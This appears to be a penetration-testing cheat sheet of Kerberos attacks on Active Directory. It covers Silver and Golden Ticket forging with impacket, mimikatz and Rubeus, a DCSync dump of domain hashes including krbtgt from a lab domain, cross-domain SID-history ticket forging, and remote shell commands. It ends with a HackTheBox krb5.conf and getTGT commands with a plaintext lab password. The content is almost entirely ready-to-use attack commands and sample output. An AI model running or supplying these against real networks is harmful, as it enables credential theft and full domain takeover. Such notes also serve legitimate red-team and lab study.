**Silver Ticket :** 

On Linux

```sh
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

On Windows

```sh
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

**Golden Ticket :**

- DCsync :
 ```sh
 mimikatz # lsadump::dcsync /all /csv  
 ```
 
 - Result : 
 ```sh
[DC] 'lab.trusted.vl' will be the domain
[DC] 'labdc.lab.trusted.vl' will be the DC server
[DC] Exporting domain 'lab.trusted.vl'
1104    rsmith  30ef48d2054363df9244bc0d476e93dd        66048
502     krbtgt  c7a03c565c68c6fac5f8913fab576ebd        514
1106    ewalters        56d93bd5a8250652c7430a4467a8540a        66048
500     Administrator   75878369ad33f35b7070ca854100bc07        66048
1107    cpowers 322db798a55f85f09b3d61b976a13c43        66048
1000    LABDC$  c101e5fcd553128d23a62df1c509a576        532480
1103    TRUSTED$        182161c2718e1d45b2202d6e35a7eb6e        2080
```

 - Creating Golden ticket : 
 ```sh
mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```

- Load the ticket to get the shell on root domain trusteddc.trusted.vl
```sh
mimikatz: kerberos::ptt ticket.kirbi

winrs -r:trusteddc.trusted.vl cmd
#or 
Enter-PSSession trusteddc.trusted.vl
#Or 
.\PsExec.exe -accepteula \\<TARGET> cmd
```

- Modifying krb5.conf : 
```sh
[libdefaults]
    default_realm = INFILTRATOR.HTB

[realms]
    INFILTRATOR.HTB = {
        kdc = 10.10.11.31
        admin_server = 10.10.11.31
    }

[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB
```

- Obtain Tgt ticket :
```sh
getTGT.py 'infiltrator.htb'/'d.anderson'@10.129.62.59 
#or 
getTGT.py 'infiltrator.htb'/'d.anderson':'WAT?watismypass!' -dc-ip 10.129.62.59
```
